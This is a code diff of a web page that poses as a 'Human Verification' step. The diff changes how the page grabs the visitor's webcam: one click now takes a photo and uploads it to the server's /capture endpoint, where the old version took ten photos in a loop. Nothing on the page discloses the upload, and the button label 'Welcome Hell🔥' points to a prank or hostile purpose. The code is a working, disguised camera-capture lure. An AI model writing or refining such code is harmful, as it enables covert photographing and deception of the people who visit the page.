@@ -160,7 +160,6 @@ button:active{
   <h2>Human Verification</h2>
   <p>Complete the verification to continue.</p>
 
-  <button id="start">Start Verification</button>
   <button id="capture">Welcome Hell🔥</button>
 
   <video id="video" autoplay playsinline></video>
@@ -168,37 +167,27 @@ button:active{
 </main>
 
 <script>
-const start = document.querySelector("#start");
 const capture = document.querySelector("#capture");
 const video = document.querySelector("#video");
 const status = document.querySelector("#status");
 
 let stream = null;
 
-start.onclick = async () => {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({video:true});
-    const track = stream.getVideoTracks()[0];
-    video.srcObject = stream;
-    await video.play();
-
-    start.style.display = "none";
-    capture.style.display = "inline-block";
-    status.textContent = "Processing…";
-  } catch (error) {
-    status.textContent = `Verification failed: ${error.name}`;
-  }
-};
-
 capture.onclick = async () => {
-  if (!stream || video.videoWidth === 0 || video.videoHeight === 0) {
-    status.textContent = "Camera is not ready.";
-    return;
-  }
-
   capture.disabled = true;
 
   try {
+    stream = await navigator.mediaDevices.getUserMedia({video: true});
+
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    await video.play();
+
+    if (!video.videoWidth || !video.videoHeight) {
+      throw new Error("Camera is not ready.");
+    }
+
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -206,52 +195,40 @@ capture.onclick = async () => {
     const ctx = canvas.getContext("2d");
     if (!ctx) throw new Error("Canvas is unavailable.");
 
-    for (let i = 1; i <= 10; i++) {
-      ctx.drawImage(
-        video,
-        0,
-        0,
-        canvas.width,
-        canvas.height
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise((resolve, reject) => {
+      canvas.toBlob(
+        b => b ? resolve(b) : reject(new Error("JPEG conversion failed.")),
+        "image/jpeg",
+        0.9
       );
+    });
 
-      const blob = await new Promise((resolve, reject) => {
-        canvas.toBlob(
-          blob => blob
-            ? resolve(blob)
-            : reject(new Error("JPEG conversion failed.")),
-          "image/jpeg",
-          0.9
-        );
-      });
+    const form = new FormData();
+    form.append("photo", blob, `capture-${Date.now()}.jpg`);
 
-      const form = new FormData();
-      form.append(
-        "photo",
-        blob,
-        `capture-${i}-${Date.now()}.jpg`
-      );
+    status.textContent = "Uploading…";
 
-      const response = await fetch("/capture", {
-        method: "POST",
-        body: form
-      });
+    const response = await fetch("/capture", {
+      method: "POST",
+      body: form
+    });
 
-      if (!response.ok) {
-        throw new Error(`Upload ${i} failed: HTTP ${response.status}`);
-      }
-
-      status.textContent = `${i} congratulations`;
-
-      if (i < 10) {
-        await new Promise(resolve => setTimeout(resolve, 600));
-      }
+    if (!response.ok) {
+      throw new Error(`Upload failed: HTTP ${response.status}`);
     }
 
-    status.textContent = "Congratulations";
+    status.textContent = "Capture successful.";
+
   } catch (error) {
     status.textContent = `Capture failed: ${error.message}`;
   } finally {
+    if (stream) {
+      stream.getTracks().forEach(track => track.stop());
+      stream = null;
+    }
+
     capture.disabled = false;
   }
 };
